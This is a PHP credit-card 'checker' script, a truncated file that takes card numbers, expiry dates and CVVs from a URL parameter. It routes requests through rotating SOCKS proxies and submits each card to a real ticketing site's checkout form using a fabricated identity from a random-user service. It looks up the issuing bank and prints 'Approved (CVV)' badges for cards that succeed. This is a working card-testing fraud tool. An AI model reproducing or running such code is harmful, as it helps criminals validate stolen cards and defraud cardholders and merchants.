<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Zone Details]

$username = ' Your Zone Username';
$password = 'zone password';
///$port = zone port;
$session = mt_rand();
$super_proxy = 'Zone url';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
//////////======= LUMINATI
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://tickets.asf.net/checkout/payment.aspx');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding: gzip, deflate, br', 
'content-type: application/x-www-form-urlencoded',
'origin: https://tickets.asf.net',
'referer: https://tickets.asf.net/checkout/payment.aspx',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=eveB0fPiM%2FSUFRKrP88U8QG7J3xh%2FxIYIEyyAaJj7cZBarN4olDx%2BuY4U2hPfzsjZq6iUdMC7g6oem%2Bgzzh28soXnQjQ6nmzjQx%2BQSJUKFy6kPiM2cTvfS9SREsnlufKxCONST%2Fwo8V5uONpQOCqrsYWcW1Zt9L7%2FVa5EDWIIaVGILBUNUeuf%2BKlt7udvxo8bPPmxS%2Fcn35abTiZwJNV2NbJG9Zg3QljDOsfhBfzJSX8vciI07mMrCaPcSwfpBNwNe7FEDA9QBSgdM4ySoTCBrGjbrVQSUiK2%2B5gOll2m7rH2yVxkSR1T8%2FkYdCEswruoawlUITisZTfav0qiEQKeAD9qbZ7EY4JGcHcB2FFKE97lGm7HypxHKGO3lwk0NDjPlKkxRWdMq29IEI%2Bb%2FSwYjD%2BsdA%2FAnaZIsSikPRSJu6JvwasoerNDGNZIxrlB82luYXp3t88%2BFXYr4xLke76NiN%2B91K3k8ZP9dZBYbjp4vf5fG1bf%2FM3Bin6xrX%2BRT5qQdB5k9EXUb4ENIH5kBITxhvjC8LO8OsagolnnOLuS1mrMh9XH5UCW%2FSI3x%2FG71xQoD83qiAA4Px8jRu6T9Nf2c%2FXUDxvcJ98kc1TpH%2FnjoiQKc36FZ6x3nf%2Fk%2Fqfnzg2E%2BnLgj2lbJyiWZHQuNHAi2HMQRoaFn6HR6gPO6WkRcPeQDS6hErpVCApxm%2Bd6nwBLsasSOGwW56KP9v56aGudAgcvu8zAw98Xxpz22xJujG%2FohaIp7K87RrxCCEeC2XaaF5fWEEvcnWJzJC9b7zg68%2FyzSIrYKtIDR%2BP9gXZlcknJE0Cz3cDcULaN35b3PbLSpGCx9m%2BYn9aShgIUaPQ0NRrbRmdUTnJtO664bKORemxeIGF8%2BIjd0%2FkIEB5YEHwp5IN5dm8NiGdN02R9AxwPMXp17NZ5goq5KMoVwOx2C24PQTQgo0e%2FII90UxqT5o0v65ayvhHuhng4e5Dhp3RRppFRahHG9blwrForerJoDRvpQONxSX6vJxXIYYlN5WvrfAEKACdMYgs7qu32cGLpK3uNapq6dxix000ZoXBQdu30TEbY5jCh4XBavVJuYNB61G6Nav9%2BoWX87wu7Urj3VkXo%2BL63KL8EHN8F6rOMEuepgyCe0Sz73Thpzfarg26AnLItjiPAGN03b4ro5ETgm1eAVSs%2FvljokbpqYZR2yAbepmPxcPfPIBbjEYf076NxR9XzwSohGo29%2FV0Ep1WU%2Fs7o%2FlKoFIIBDSu2j1zmK%2BUiF1kDvs0e6tvxqluJC3gMx0TgopBcUlwrGYQMpui4%2BFTHAkIUEzHSMEGKzWIhrr54lxb%2FtJ1wUuYds%2F9sXM62v4owO9vGlxDragiYMH7UyBjP6naSTfJkARkdmNU0t08PgHW0V4rNSyLFnWWBUNbAYObZ59ki0RtzDBH1NilUXCtIyPVYk81fw8QonA3xCEElylfUeat3NX9JbXO1Xj%2BYaz3o%2F%2Ft9hGR6mtMSgkw0U2Yyrc5up%2FGx6TMAqCjcQCBWus%2FBvfc1SIQXc4ZUzuq4nmKislbkkA4oHdU%2FPa5zpDAZsN1YC8d8qLTln1H5fok97eUFic1cLeVb5Kyyt1%2BgW6PXYJ3eTnPDZNHFseGP0F%2FNPAo0BAQkgQG%2FS86pNVDwXE0obVCtwMoVQQbooq26Kw0pusdlW0lIF3ebOzirT2qfUuQ%2FXSL3m9MoeiV8zrgK90zbqZcm8ynmd25rc4jEbHS2VKz5Z9lZ8bbxx%2FSdd5nZQE0RMhuvRvw%2FditjJxJ2nkWwp0oLPq%2B1EgAbDLSwGOfT29eDqFfsgFTEtOfTxmhqcSDcBzUjm0Idl96LaRa9uMlgaD5C5RhKuRR665AmSVDfIwAH2nt1q64dn%2BBPvO5KPX8qY4iSgKZ%2BRcJp2GoFE4Fopd39HCdZT48dNF%2F%2FjvQ1I0qQfDa%2F%2BFeUBOvYhb30tHhXaJltf20JqS3%2BIO2zVB1JXxmksCi1b8ZtoE8x12L0TKAt%2FD%2FaEE4%2Fp%2BxMwpo3vo09ZLarEiXToiYsNYZmZkplY5DOH2KXqPjTacKKfb1evTQFLzxc5pc4x1zabDrbUSQg1cnxtn6VlbMdRPDtXcC5fDg004jIylYSGQt5P9u2TcrYeav6wcRhIVe8oYJilPWpoL585XApGOnN9CNDw2Gacy9sbinBF20heQHej2Ti%2FWw9mVO4cw%2FJRWd8KipRTW%2B%2F9IUZwydQuqLhiOhnVIbrHiP9o2WxXkXqVND%2BF8q4RMB68BRT5WGV56jqLxe3ZZB3qxhWCOe5h03ES3O8W59jBDfYZUNxzcn4ltInw%2BRSU0FUP6ScdfYJuf3KlFb0pkGjy384uDpwxcUJEuro1xw7PPDulTk4sQCOjl8g9ztE9zSonGyA5n7gPOdbidEmdQ4cZqRHsIx%2BZE0krVJ3PvZO7gDu%2FXyJ%2FV9fyRg0a9DXqn7EwuPqldEww8bC%2FJinyOG6Y7at5Tin4x%2B%2Fz5tEx8wk1HVGYLci3S%2Bx9JZXmrgVHWpHiNIsF4BhhP%2BIYgeHR2rNLy%2FgIeFpIAS71E9hAvzQA6qBzgEeXZaHtTcbiB0MynAHStkkWVA8uYyOFU1Vk%2F%2FREEYhiA982FL2%2F6vfRpcrVcEIS5BieL0MxKjjv%2FUAhEoZTk05rW%2Felhh2kpwV%2BOm4PnoJFz9rR%2FqcQKkYHtIhpq%2FUtuprS12aGNKPbeXxzVYWFvj9hJ9A0mPhUOeAvser4D6kCcmF3AMxo7XmS1S%2B4fpyI1URx2DNDMSgJxYO4F1JOGeb9VbPlkSM4BGlQXd5xfJSX%2F91LAS3JHNb6W1eRO%2B6W%2Bxs9TseK9YlyqhTvqodBgyDaIQqTpGz9f0QDbEB24d6uJ1rRVEscpyE5RoL9vF8nO2VeVw4GBLeq0t7%2Fykv4%2BXPnBbb%2F46EZXTenB4nsM2sz7IIoBEYxfoI2dfYYZfCvRMl5%2BI8zq0x65i0QN6D7pC1MxGH6aVuJoGd0PRUL8DLAm6ji7QAiuG%2Fg1px6UEhp3egzIpOnSdUVhp2DbAdkO2mv%2BbnXN10Nur7od9nfzaRw3kg5Bklqdnu3P5VQ48OX3sjVNx2793jfDM5Im%2BdlnSzUI6H7%2FC41cN12c00CAotdi8fg4%2B%2BN5oOmDzG6yO9fFfpwx%2Bm17ggU7cn8QRzdkHKNfvrFWrZUtduCg7JTsfiIfIGIPEz0yDfY0uu7Mr22s%2FxNUEFY9ctqZdqxakLVN2ONesdWI3kjO4GgekgYNN4b6UEAtTwnMP3rM3ZBD1m5c8AWZgHEACl7aud276BHI28%2BFRlnktlru3O%2BDwvqZrXUTe9zTB%2FmBadxJXT%2FX5PRzpe6qJEneWGdSRpxXvG4adABLgqppYGInfYRXG0jYKBRehTBz2b5Agvf216%2F1Jmn7ASPcU1O0KgTyKuvhKp1xgluBViQRFC6U9ZenGOxYDxoqaVjgQqZub%2BVYVxdsufR5E8dV3yD14moY7Wsq1aLLnZV07E%2Bwwa6MjROuReVjm46tBIoisRp%2BW3AYlhrzQCdGs0CZ%2BprqS2qFvaCJbqihPgKIb2u7zceaUYmBfJ8xPRdpzbtqYxhJWQgqQ8HcweMIxYVPFmgEDqszOYqMWonhb%2FVSq1KfEQQiyFEZehyGc6Yq%2FbG3PLcq5O6QVRPGTaS3pMPUSpXeS4el5ntGJ%2FlMbFyy5UA48elj7y0uJn3akR%2FFnUf%2FWSMmL5CYGjtmIzvgLOXS7hueG%2BrcTi4caeS9oKdA0cDiqf7uOA8DzMRoX8IiDz56p7NiT0IzX3J1TEIGDdxZvE7OSunrsS0noQgpfDg83K7vKCwpc6MSVUe61TJrgr043YzF6HOEqgD%2FgQbOxbq8JXINfU1anf1tU%2FLvhwyjqUiMFdT7W04PPl6YlhoPWRAmkGgATTa%2B1uf4TpK61AGWi0cnAsUrdvcwzsqt%2BvM8yFaKjRhww5FB48k7%2BRLqehC%2BVxBVrMizzWkm9dZ4baBrc3jCy3J%2F5s2qvlYvV1mnebXeEB3vdiEoWK%2BJDZvsJQyMsWTkxoCy3xP0SGAedtH0OPCNMY3FQ2TwzdtEyisyTlHr8RXkaejbknG7DIucePL34Xaz7JrN%2FZ7eg24fUgNfdjnKaRAqhxCz5p%2BEc%2Bdhx0fbOEfcy%2Fse9xPG8Rkqm3jnmxMCCzcDyr0b9%2BHqh%2Bv7zKgIiDwcDtBizcz6FZwWHy9pLTtskQqwSx6hJpUpa0hihKkOC8mtSGirjxhqhh66plLLP%2F35H7zgWvbUFUdswLioHW0PkjWFeO2dChoNL81%2FCxr1C8WFhWzxffiIysol87Bua%2F93MOQCJ6ntq121EGeNN3inz3CVM2j1DIvUxIsZ5EwggJnKVFW67lHAucxyr66lX8L%2BQnckLK0xtYUKVC20HgGaX5MgwqqG89rA7ewoLWCcBlx25qE7pVPDtlCed%2BZhSdipPzOyOO7tS%2BFX%2BAxNwG1Xt%2Bk4EIlAKMVj4oDsxaHnab8PhHk0Q2ndncG%2FFRaDGXhyqy%2BgQbGAosP7ux2RjBT9vRRSRDzpjEhS9WXW7rG54Q3rWX402SoVxitDBYvghcX95GTHlbQ%2FtS1hYWLB9iK8qQCU%2FuIuUN36wbSorgPx4T%2FEoC%2FXi0qTzz9yR41xngs6W78K0nXGOzexaZcaNKKHseJ7k0qgcOoihHjQRHJDzfyQWmXFXXfnsYoOUXTszUVV%2BVlC1U4wVIFe38Sle0t7VTgZdh8cpg6LJ16z7VEfmXrbobu6EWOTltog84wZNCLv2pPTd1sUiX7Gby51SsrksPg9qWp%2BZctNFNeMGqEXdFhu5JxhhoUo3grfCy3299WhnAzuB6EDqyFZJe36dcGbvgb1Y9ITH84Wl6VgBt61YbsJAUiDD%2Fljfi3FrwcmsPYuVZtdUPgBSK0LOWGu27WUNUi9StQHj6HaRiHbCnFgrtx2EjutwGjEEz9JXmf4ELKZ48SPGies268OZx4QeKNhzf%2Bn7XD9vBIO523JsooKKsA1vb8ft4X7L%2FOb1s%2FarNie9Jv44wH5Yj66soeLOGTV5q0WF9qJpVfGgpX6jpEi3pXaNfr2BVWyu6AO5eZPHMWdrJx52rseVQpCu10W4twS52l2TdccAEe6rofKZVs%2BuAbi9XWHiMhLUCFD4EZNVyI%2B%2F4%2BND%2FsyfwQpDpepiocyyEwkjege8nsEc9ariq%2BATTThsVoZZsfZ6aQQyN%2FlScS0YJOPDbvhE0jPt65sIsUOKwVLT0A9V92ux%2BiJWQoe58MiUIJHtHxZjM7C%2BshOFg2kg3fVFVyCf%2FUaKJ7GxiYfEc9dVO1zWntBfuVsSQvUALK2P6esfwH761EaizjuN1AmKedchoH6sgOaW0jg%2FLv4ZH56Db5cpFAOoiVrkmJchLNAyJltGrSsPQL7TEB7WghyF34azCwmO%2FbDx9yE8hmneWECMSo3H8v1UuPK6dIV8KArpZikYDNIVkOomgamkB3yM9lG7uO0yBR%2B3ezw8oFAmGdsA1lWs56U%2BjuGrxZhNGS4XeGJjrCzvxjKNq5cB5ln1vcRa2WpzBHbnLORSCkTz8r36Jgq2iQUXQFj9WVjWkFYL8eyGHG5%2Fg0cWr%2B4vmOgWiKdBKnLERqeSA5r617eMLe2w%2Fe9jn%2FONLpnicvURZ8zxP7uMAeKxZOAatZ1ugtOWrjXRk9lBxl%2B9m6%2BwkKKFd0UDAeXavtuaHSB0I%2FW9OC8YzHanFh6zO9aCfI1hiVJRC4eqyEgP6islKWeeW3CsS96s0hQBRU%2BzYy1UcPbmfbIl46k53IuiR4RtMkJ8X2PBgV6QSQ9lZKq%2BSjOAaqr9W3ChTDuzrf8d3NXjwaxzOd7i30szX6MncTtdI3TB9MQ%2BR0ITOdZPjNQqY25ttAUFwCaNafCcZP%2FL5F8e8c%2FAxcp0AEWiEBGurTTulua%2BJfS4YswJaT9TFwbtwOEHFuHgn1y89sGRGOWcMnxNZrf3WJj16E5QsUC0Lj7fijv5xSDwYA%2BMBIGM%2FmnRT2Yq5glUj8EPsFxqG%2By1XRkXn4%2FP6WzHi83p592Gk3xK18KzIQ2PxXjk8Cocaxt3QvVT0jf9Br8vegWAr9nD4ByhFC%2FtP1JCs3HBrrtq%2FaQWdeOT051hdip%2Fp66VN6eqNgJyMGq4aremlQNVhSISrfNhr%2BliA4hFRUov9a9eNI%2BPEeI5XJxHaI43Yf5TMr6q54mtmTaeAogNw9hcvyLigNR%2F%2BUF57kTnElK7LkJ47Q2hIuhuMJk87WJletedmjuuzrbBUabYdtgC2yOCU%2BhtY074kt4AuDfkof7JSwuAh79Cdio9mlDj6NizpT%2Fff109Z9vnNRmxHyhcag6YmJVUlFJiJSlHNH2W3cun1j3rRqkOy6K1FB%2BRkQnYkEh9GLPleHcSiPussteC%2F1bZzqtZQbjgrO%2FndUO8WuksHAhJlMGFIQCaGUBvytE%2FzaDy%2FnHRaFE6J90CgPTA8b6h3WX%2B8m3Nc1u9LtmDASUJ1Nle8aC4YfVILGtMhwOIr0T8zuoJBSm6toU7%2Bjxq22UUPCt8fQRia07ELSbsO9klcM%2FL1iHtfjfc0ybZxi%2Flieweg56%2FDkpNcCrDagvgIuvTBhp9LK0BklMWN1U4pDwm0OoeEuUa%2FvDF37PN29yxDjAFPH8WoVzATfO2ufkAD4TmzqEReTTYVLWXImGrsM8wfkNbZd35WlgDCO5VCu%2Fh3Wkb%2FeIBYf0HSFYHQjhas5rC9SHPyGvyz8WvcTVs05D1VSI9bGoivKm2rz8ZlZxpk4U%2BRrPFVU98kbvNjTqmwy1AT3ipbpaSBVvyB1QXMPNlmjhYq2ImBlUvpBAHto6xtmdvDAfqeLoOos1hlSEfGrtTS5t6seK%2Fp8bYQeTJhFJYe78cYf4Mbkzxq54WoF%2B04HUxvDQJXxE1jBskz1pHnLz05hcA3iSx3rsO6wAFcRkf2xnWY1alCdDKfI9pC5jEz%2BZ54uZDn%2BV1Y0VyjdYo8YU98U7FlGLdQh74p%2BbKfCh7SWLzgYFVAckJ5FjwqLwCbEjAp2hWCCLLelUP%2BuNZzPsikp%2FyDc856pz%2FjiA7Vyl8cfJRF9YhIRrBDevuH%2BbdhMM%2F0BWZfYEGMwnPF4kvQQOvpICHBqxCPphU%2Bwk7JjzLSZVW3lKwCacof3TvpDVnFIxQQ8ySckRIRf6j4Fns0t6FyEgIerotuVBF4pZTA2Z9UlC6%2F9V8fin0XzIeUBfFtsqv7gEuzWw6B6q%2Bs7yf82Gw5PdEYbsKYq%2Bf6XkhDiDS5ZvUeRl4VO0HPnYK5zIP95tH8QN5sfgGhEBAlg9a%2BbgAIB3hToM3ggY9F8v7DYr2kWzas74t13C%2BNhlkfiZF3A1idOG006aQ0cg10Lmm1BCYwCKJcPLF8x4ewK3eaGwlM%2BxIjOK1vSvpPr4kJ%2BO%2FLrqBGTIL4W5hWXTJzjPcdJ8GiS4e81b4v6PLQVt7bhwNNa6mVamlAXwudnw4oTaA3aEdTtSsQ%2FZ0uh3QHT41f1YP9BiekFdk17tNCTd8whiHed8%2BeN0sEbVTE58EwTMG2Tqa%2F5BTe%2FMFuuId8iHGBy2b5ia7A0rtckqRknUg09h%2F23teTrl1Z8q%2F1AB2WCuisyVZSY1V%2B6uA5hQuhF9vGpmNOl1U0yKdI807oHBMZp3mRv4UVCESmyBk90jzqVHlncZf5Iok2fFqxIcPkzPn3g7pg%2FgeGMv0Ojzg4tb%2F1bx0HSacnBS4379XOyU01lEPldOiurvsM3g%2Bo4GNi2tSddiGvG4hXf%2FRDm6k%2FVDH1B94BphI46Cz%2FF3aWETXm6cJ7Qc3ILo%2FdY1UA5li9C2BJR6yk91dkX4WBcqj%2B6AcjcXk4Mr3Td6Fqbw2pvAOtz8IB7dnnz7S10jSLm55sJo3ffa%2FEgFbNDRHUZDIkVpivUP%2FqzvVFSVJgd8X3Cvj2Avjxpi%2FeIfF44CN60WqpWCkbTS7SVICr08gpzMmE2vjqAZXqQlLGsmcSQFpXaqr0TpWz%2BHbNh3YUofGLuXNmGRErCxkYsbEEJf8ORpprtvKxXpSqWWWYYNVYA4TT%2F2koxfB8GzU5geGk9%2BQFIrvr%2B9c%2FOoIdSNSdMsIHtfZUEQ%2BAmmXvpPb3jx1Uv9joFrtDzgu9deYAW10f66H7ZttM20zs2%2FTZF%2FJCw7U4yT9iZhHjWLHnIXdjtxh2QCn37uqMxtknfEuYFmxjcwwrwtD0t6NBDziCROGFpnYFTZa6FXl9xPwwMfyPAhl%2FlrmIugrv%2Fh0DF%2Fyn63b3wKaN97Qo0BaWkToOsPCobriFoGhgjBEEDjnBy29sjCtQxyIygC5ICiRpANo4RxoLLrkxx7nH24%2BOhBsWRh%2BsUtgDVKq1GH%2B%2F2wtfQKjERCTT%2BjiF71BWwi8aiNrR1qacXrfE8MgHKMg3RcRkengVdFex%2B0jU9%2FRYIwwo%2BB2eiXQdpop5x0tEsVxwGsZ8dQBawYlO%2BtT5LecMMTVdIaiZsV7bdph75bzDrN7u8J8vga7kgK03J8IFeAxWjM4F%2Bg15br0YzZsD8w%2BvJ7Vc2lUoJEZ8CHwn83ULWXddml3UY1zSVL1sChBdeQ7ol0v2KW%2FNjAtiTzX9R6ow2eE92uQQ9itZ0S0dst%2FRJ%2BQFR4tDqhPp%2Fy3YBKlxV7AKlkxtbA%2BPE%2BE1%2BVOUI4b7WzA3tdbcqTP20qNAGtxHcsEFVa9nWitzz0hK79LeS%2BzDwBnMmTt4EGYVjRSfx9efKBZt%2BF8BhbLqHQZh5ZFAh6aFYKAA%2BDisVpKXmyL5yZUHFJseDPdYcG5tcIWJDHgEx2N6D%2F2GeQBfCI33cMn3R3hlFZTaNHqUpdd1cqM%2FLkXiBEK7quQs9JeIKYgg3qH2ZN10tSP7HsZfDc6uvHm8iUKTD4pks7aVte%2Bfyk1Ws9wKVpL9JxUGCGogSDfr0s4FYj0DkqOogsVEkt2lPqaWTxygY1KSOkOjBLwIZIoZq1tUd43Pt%2Fp3t7XyKjmE%2Flrpv0vwauxsx99y1e4deAP8Xj3%2BTYbs41MejN5bXgZIea4Je%2BPK6NclMHfM%2BhO5w%2B0KuyyQXO8sHaBG645myYdYI9Vu3fsxdWTAyNfqoZ9PzSmOv6w8fmo12xk9kmWo6n32TJhFNN6xH%2F5rpsY9YU1Sk98MDYgSAS6Pd7ACxepXqrlMStU0haJM6D%2FZjni5HYqmYIyNxe7dsZDr6Y9l5IZnuY17UiIKkbVa1uaga7cNmt86sg1OFYX7s0LDE6C%2FDpkI4rUdwIdRaBzd1LQ5AmLydmHi4eFawq9Ch4udA6rlZk1b7dOYMm17lDbRAmUKf%2BAYvjoFNwa2f3lzDlrLdLGx7EPXhOlhdjoO82nUgkdIDOXt3ugbCdn%2BFBu2eJKTHbaoKLfmVgfIyBbuPtBmjvFOqTqIdv1f9oL4iEPjnRWexsjlYNQPRWEO%2FFWKTZf%2F%2Bml3%2BUk7jzZZjjDZfsXydiU%2FpMATM4hdiqrZC34FAEC86floGYkuRKp2%2FJ4OT0Ea2SApdeTXNBfXjNaNuOz0Kdt5ORDhuzo3GTIsvE9l9fCYozDQHK9K7IZjes86cGp3hfnqQjOXJZbXf0eJVSE1i7o%2BvOCzTMsjyRJARoNwByRq%2FDaSs%2F%2Bbst4lCXbYAAJ7tGr0FbUYw1zdulxz%2BzWdfJ10GCBw0OoX4uDzq5cZpSUDn28JnyfKXiX6Un6IZGrgqYjqhRgI0wbCB3Bk%2Fn9%2BgCdviZ1jx%2FOlA0ohEC2rBxO1iHVcIP%2FuiJAS4XOfftbSctBTxP3FnSLPAmstEeo2IvDxz%2B%2FGPKL6M%2FnmCx6lts0%2FJnJDe4igYImTk%2FQMrhwX%2BM%3D&__VIEWSTATEGENERATOR=ABAE12C3&__EVENTVALIDATION=jFn49bPZgGHhgccqelHX5bHWPB0EySx7laCkucwmTugdQFQkcREepwxnu45KRJKK%2BL5jeyRsutlH%2FUkxavuNdzcajAlcJnaUn%2BlklrAlPNb6D8TyTYYXZY%2FS%2BJdqXV9ovbGkN2gARCdfQdxUZei%2FgmQvwetKeUesriC%2BzJfVFuHrpExrCvAMyU2PvaBOhk2ujmid7%2B0RXb8RQ8yh4hR4N0bY%2FeUe4ZzsfRyFhwWZDlE07u4QBiJjRutgit3U6o36gv0ytc8IG36Xslqt%2Fi29Ic6CXHq%2FC24uN2NRLRzO42PKYhAD4ej%2BPf%2FFMOv6DhY1Xfao4kE%2BwOLHEpGQw6ZUjZeJv2e9lQ3%2BQFXpxXwLCzXPJsBp90tQkBoJfo69Gwl5yyVNq%2BQB%2FDn18bNdoZ0uvB3AdeWBOpyL4kt9EG3I%2BM%2BL1lMzfrRR6TkNeZNw6FNQzOh00si4rOp6j5vlk5fHUUDNsma8e1zE3MNrJog7Ux4hq%2FMlY2PONlBqTerlKGQoSLGIwXQDwBQUYnAgqEPAVpGXZIKGYK4tSZyknJdSDwa2%2FIR3V1KSo9M5BQchENXR07Sa358%2BdoNSTNBwqD20dbI2YWgn58x9xooJqoeoy8Q16MEMO1aB2mSJTx8d4weAl8dVsSaT3T92yLY7rJd3klcDHGlDVgMVL1i9UI%2BD2KWM4BcU5Ku9a2CQzh5VPyvoYna1hp0jPB8NbQXfr%2Fzb8SEGIvEFHX7IgyNJBSmtt1YSA3abMEbbxkGvR%2BBeBkJ8z84HmwzAykv%2Fr3Re54m%2BDdaU4bQ%2BcTNiCFnWOjSUuO7I0aMY8%2BY8CXbWZS%2FbrB6UBANyA1%2BCIcIGw8M6VQCTLmVMeFU%3D&ctl00%24mainContent%24txt_billingPass=&ctl00%24mainContent%24txt_billingConfirmPass=&ctl00%24mainContent%24ddl_card_type=5&ctl00%24mainContent%24tb_card_num=<$cc>&ctl00%24mainContent%24tb_card_name=c+bell&ctl00%24mainContent%24ddl_card_month=<$mes>&ctl00%24mainContent%24ddl_card_year=<$ano>&ctl00%24mainContent%24tb_card_code=<$cvv>&ctl00%24mainContent%24checkoutGuid=b236e6d2-c8a7-4a78-83bf-e80efdaf1c56&ctl00%24mainContent%24btn_payment=Buy+Now');

 $result = curl_exec($ch);
 $token = trim(strip_tags(getStr($result1,'"id": "','"')));


//////2req 
$ch = curl_init();
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); 
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, ' ');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
///'Host: ',
  'Origin: ',
  'Accept-Encoding: ',
  'Referer: ',
  'content-type: ',
  'Cookie: ',
  'accept: ',
  'sec-fetch-dest: empty',
  'sec-fetch-mode: cors',
  'sec-fetch-site: same-origin',
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,' ');
  $result2 = curl_exec($ch);
 $message = trim(strip_tags(getstr($result2,'"message":"','"')));

///////////////////////// Bin Lookup Api //////////////////////////

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
	$type = 'Credit';
} else {
	$type = 'Debit';
}

/////////////////////////// [Card Response]  //////////////////////////

if(strpos($result, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
